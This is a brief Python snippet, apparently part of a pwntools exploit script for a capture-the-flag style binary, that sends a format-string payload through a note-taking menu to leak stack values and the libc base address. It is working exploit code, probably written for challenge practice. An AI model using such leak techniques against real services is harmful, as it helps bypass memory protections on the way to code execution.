def fs_leak_local(i):
    p = process(elf.path)

    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"note: ", f"%{i}$p".encode())
    p.sendlineafter(b"> ", b"2")
    p.recvuntil(b"--- Your customer note ---\n")

    leak_raw = p.recvline().strip().decode()
    libc_base = p.libs()[libc_local.path]

    p.close()

    return int(leak_raw, 16), libc_base

